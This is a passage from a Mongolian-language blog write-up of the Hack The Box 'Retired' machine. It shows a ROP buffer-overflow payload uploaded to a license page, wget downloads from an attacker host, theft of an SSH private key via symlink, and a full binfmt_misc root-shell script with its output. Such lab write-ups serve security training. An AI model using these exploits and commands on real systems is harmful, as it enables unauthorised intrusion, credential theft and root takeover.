</span></span><span style=display:flex><span>¬† ¬† <span style=color:#75715e>#int mprotect(void *addr, size_t len, int prot);  </span>
</span></span><span style=display:flex><span>¬† ¬† payload <span style=color:#f92672>+=</span> p64(pop_rdi) <span style=color:#f92672>+</span> p64(stack_base)¬† ¬† ¬†¬† <span style=color:#75715e># addr = Begin of Stack  </span>
</span></span><span style=display:flex><span>¬† ¬† payload <span style=color:#f92672>+=</span> p64(pop_rsi) <span style=color:#f92672>+</span> p64(stack_size)¬† ¬† ¬†¬† <span style=color:#75715e># len = size of Stack  </span>
</span></span><span style=display:flex><span>¬† ¬† payload <span style=color:#f92672>+=</span> p64(pop_rdx) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>7</span>)¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† <span style=color:#75715e># prot = Permission 7 -&gt; rwx  </span>
</span></span><span style=display:flex><span>¬† ¬† payload <span style=color:#f92672>+=</span> p64(mprotect)¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† <span style=color:#75715e># call mprotect  </span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>¬† ¬† payload <span style=color:#f92672>+=</span> p64(jmp_rsp)¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬†¬† <span style=color:#75715e># jmp rsp  </span>
</span></span><span style=display:flex><span>¬† ¬† payload <span style=color:#f92672>+=</span> shellcode¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† <span style=color:#75715e># add shellcode  </span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>¬† ¬† <span style=color:#75715e># File Upload beta.html  </span>
</span></span><span style=display:flex><span>¬† ¬† r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/activate_license.php&#34;</span>, files <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;licensefile&#34;</span>: payload } )¬† ¬† ¬† ¬†  
</span></span><span style=display:flex><span>¬† ¬†  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:  
</span></span><span style=display:flex><span>¬† ¬† main()
</span></span></code></pre></div><p>shell balance:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wget http://10.10.14.58:8000/linpeas.sh
</span></span><span style=display:flex><span>chmod +x linpeas.sh
</span></span></code></pre></div><p>var/www/html –¥–æ—Ç–æ—Ä symlink “Ø“Ø—Å–≥—ç—ç–¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ln -s /home/dev/.ssh/id_rsa /var/www/html
</span></span></code></pre></div><p>“Ø“Ø—Å—Å—ç–Ω —Å“Ø“Ø–ª–∏–π–Ω backup —Ñ–∞–π–ª-–≥ tmp –¥–æ—Ç–æ—Ä unzip —Ö–∏–π–≥—ç—ç–¥ —Ö–∞—Ä–≤–∞–ª id_rsa –±–∞–π–≥–∞–∞.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine VM</span>
</span></span><span style=display:flex><span>python3 -m http.server <span style=color:#ae81ff>900</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Local VM</span>
</span></span><span style=display:flex><span>wget 10.10.11.154:9001/id_rsa
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> id_rsa
</span></span><span style=display:flex><span>sh -i id_rsa dev@10.10.11.154
</span></span></code></pre></div><p>user.txt</p><pre tabindex=0><code>3ff5b1*******
</code></pre><h3 id=7-privilege-escalation>7. Privilege escalation<a hidden class=anchor aria-hidden=true href=#7-privilege-escalation>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cd /proc/sys/fs/binfmt_misc
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dev@retired:/proc/sys/fs/binfmt_misc$ ls -lha
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>0</span> Jul <span style=color:#ae81ff>10</span> 21:40 .
</span></span><span style=display:flex><span>dr-xr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>0</span> Jul <span style=color:#ae81ff>10</span> 21:40 ..
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>0</span> Jul <span style=color:#ae81ff>10</span> 21:40 EMUEMU
</span></span><span style=display:flex><span>--w------- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>0</span> Jul <span style=color:#ae81ff>10</span> 21:40 register
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>0</span> Jul <span style=color:#ae81ff>10</span> 21:40 status
</span></span></code></pre></div><p>EMUEMU</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>enabled
</span></span><span style=display:flex><span>interpreter /usr/bin/emuemu
</span></span><span style=display:flex><span>flags: 
</span></span><span style=display:flex><span>offset <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>magic 13374f53545249434800524f4d00
</span></span></code></pre></div><p>Status</p><pre tabindex=0><code>dev@retired:/proc/sys/fs/binfmt_misc$ cat status 
enabled
</code></pre><p>binfmt_misc
–ë—ç–ª—ç–Ω toolkit –∞—à–∏–≥–ª–∞—Ö:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git clone https://github.com/plcp/binfmt_misc
</span></span><span style=display:flex><span>cd binfmt_misc
</span></span><span style=display:flex><span>./binfmt_rootkit --help
</span></span><span style=display:flex><span>Usage: ./binfmt_rootkit
</span></span><span style=display:flex><span>    Gives you a root shell <span style=color:#66d9ef>if</span> /proc/sys/fs/binfmt_misc/register is writeable,
</span></span><span style=display:flex><span>    note that it must be enforced by any other mean before your try this, <span style=color:#66d9ef>for</span>
</span></span><span style=display:flex><span>    example by typing something like <span style=color:#e6db74>&#34;sudo chmod +6 /*/*/f*/*/*r&#34;</span> <span style=color:#66d9ef>while</span> Dave
</span></span><span style=display:flex><span>    is thinking that you are fixing his problem.
</span></span></code></pre></div><p>not_writeable - –∫–æ–º–º–µ–Ω—Ç —Ö–∏–π–Ω—ç, register —Ä—É—É —Ö–∞–Ω–¥–∞–∂ –±–æ–ª–æ—Ö–≥“Ø–π –±–æ–ª–æ—Ö–æ–æ—Ä.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>binfmt_line<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;_</span><span style=color:#e6db74>${</span>fmtname<span style=color:#e6db74>}</span><span style=color:#e6db74>_M__</span><span style=color:#e6db74>${</span>binfmt_magic<span style=color:#e6db74>}</span><span style=color:#e6db74>__</span><span style=color:#e6db74>${</span>fmtinterpr<span style=color:#e6db74>}</span><span style=color:#e6db74>_OC&#34;</span>  
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;</span>$binfmt_line<span style=color:#e6db74>&#34;</span> &gt; /tmp/temp.txt  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>cat /tmp/temp.txt | /usr/lib/emuemu/reg_helper  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>exec <span style=color:#e6db74>&#34;</span>$target<span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><p>source</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>readonly searchsuid<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/bin/&#34;</span>
</span></span><span style=display:flex><span>readonly mountpoint<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/proc/sys/fs/binfmt_misc&#34;</span>
</span></span><span style=display:flex><span>readonly exe<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$0<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>warn<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    1&gt;&amp;<span style=color:#ae81ff>2</span> echo $@
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>die<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    warn $@
</span></span><span style=display:flex><span>    exit -1
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>usage<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    cat 1&gt;&amp;<span style=color:#ae81ff>2</span> <span style=color:#e6db74>&lt;&lt;EOF
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Usage: $exe
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    note that it must be enforced by any other mean before your try this, for
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    example by typing something like &#34;sudo chmod +6 /*/*/f*/*/*r&#34; while Dave is
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    thinking that you are fixing his problem.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>EOF</span>
</span></span><span style=display:flex><span>    exit <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># function not_writeable()</span>
</span></span><span style=display:flex><span><span style=color:#75715e># {</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 	test ! -w &#34;$mountpoint/register&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># }</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> pick_suid<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>	find <span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span> -perm -4000 -executable <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>	    | tail -n <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> read_magic<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>[[</span> -e <span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]]</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#34;</span>$2<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>=</span>~ <span style=color:#f92672>[[</span>:digit:<span style=color:#f92672>]]</span>+ <span style=color:#f92672>]]</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    dd <span style=color:#66d9ef>if</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span> bs<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> count<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$2<span style=color:#e6db74>&#34;</span> status<span style=color:#f92672>=</span>none <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>        | sed -e <span style=color:#e6db74>&#39;s-\x00-\\x00-g&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[[</span> -n <span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]]</span> <span style=color:#f92672>&amp;&amp;</span> usage
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>not_writeable <span style=color:#f92672>&amp;&amp;</span> die <span style=color:#e6db74>&#34;Error: </span>$mountpoint<span style=color:#e6db74>/register is not writeable&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>pick_suid <span style=color:#e6db74>&#34;</span>$searchsuid<span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>test -e <span style=color:#e6db74>&#34;</span>$target<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>||</span> die <span style=color:#e6db74>&#34;Error: Unable to find a suid binary in </span>$searchsuid<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>binfmt_magic<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>read_magic <span style=color:#e6db74>&#34;</span>$target<span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;126&#34;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>test -z <span style=color:#e6db74>&#34;</span>$binfmt_magic<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>&amp;&amp;</span> die <span style=color:#e6db74>&#34;Error: Unable to retrieve a magic for </span>$target<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fmtname<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>mktemp -u XXXX<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>fmtinterpr<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>mktemp<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gcc -o <span style=color:#e6db74>&#34;</span>$fmtinterpr<span style=color:#e6db74>&#34;</span> -xc - <span style=color:#e6db74>&lt;&lt;- __EOF__
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	#include &lt;stdlib.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	#include &lt;unistd.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	#include &lt;stdio.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	#include &lt;pwd.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	int main(int argc, char *argv[])
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	{
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		// remove our temporary file
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		unlink(&#34;$fmtinterpr&#34;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		// remove the unused binary format
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		FILE* fmt = fopen(&#34;$mountpoint/$fmtname&#34;, &#34;w&#34;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		fprintf(fmt, &#34;-1\\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		fclose(fmt);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		// MOTD
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		setuid(0);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		uid_t uid = getuid();
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		uid_t euid = geteuid();
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		struct passwd *pw = getpwuid(uid);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		struct passwd *epw = getpwuid(euid);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		fprintf(stderr, &#34;uid=%u(%s) euid=%u(%s)\\n&#34;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>			uid,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>			pw-&gt;pw_name,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>			euid,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>			epw-&gt;pw_name);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		// welcome home
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		char* sh[] = {&#34;/bin/sh&#34;, (char*) 0};
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		execvp(sh[0], sh);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>		return 1;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>__EOF__</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>chmod a+x <span style=color:#e6db74>&#34;</span>$fmtinterpr<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># binfmt_line=&#34;_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># echo &#34;$binfmt_line&#34; &gt; &#34;$mountpoint&#34;/register</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># exec &#34;$target&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Changes</span>
</span></span><span style=display:flex><span>binfmt_line<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;_</span><span style=color:#e6db74>${</span>fmtname<span style=color:#e6db74>}</span><span style=color:#e6db74>_M__</span><span style=color:#e6db74>${</span>binfmt_magic<span style=color:#e6db74>}</span><span style=color:#e6db74>__</span><span style=color:#e6db74>${</span>fmtinterpr<span style=color:#e6db74>}</span><span style=color:#e6db74>_OC&#34;</span>  
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;</span>$binfmt_line<span style=color:#e6db74>&#34;</span> &gt; /tmp/temp.txt  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>cat /tmp/temp.txt | /usr/lib/emuemu/reg_helper  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>exec <span style=color:#e6db74>&#34;</span>$target<span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><p>–•—É—É–ª–∞—Ö</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Local Machine</span>
</span></span><span style=display:flex><span>python3 -m http.server
</span></span><span style=display:flex><span><span style=color:#75715e># VM Machine</span>
</span></span><span style=display:flex><span>wget http://10.10.14.58:8000/binfmt_rootkit
</span></span><span style=display:flex><span>chmod +x binfmt_rootkit
</span></span></code></pre></div><p>./binfmt_rootkit run —Ö–∏–π–≤—ç–ª</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dev@retired:~$ chmod +x binfmt_rootkit                                           ‚îÇ
</span></span><span style=display:flex><span>dev@retired:~$ ./binfmt_rootkit                                                  ‚îÇ
</span></span><span style=display:flex><span>./binfmt_rootkit: line 52: not_writeable: command not found                      ‚îÇ
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>root.txt</p><pre tabindex=0><code>d34f6a*******
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul><nav class=paginav><a class=prev href=https://cadil.github.io/posts/2024-03-13-htb-opensource-writeup/><span class=title>¬´ —≤–º–Ω—≥—Ö</span><br><span>HTB - OpenSource</span>
</a><a class=next href=https://cadil.github.io/posts/2024-03-10-htb-catch-writeup/><span class=title>–î–∞—Ä–∞–∞—Ö ¬ª</span><br><span>HTB - Catch</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="—Ö—É—É–ª–∞—Ö";function s(){t.innerHTML="—Ö—É—É–ª—Å–∞–Ω!",setTimeout(()=>{t.innerHTML="—Ö—É—É–ª–∞—Ö"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>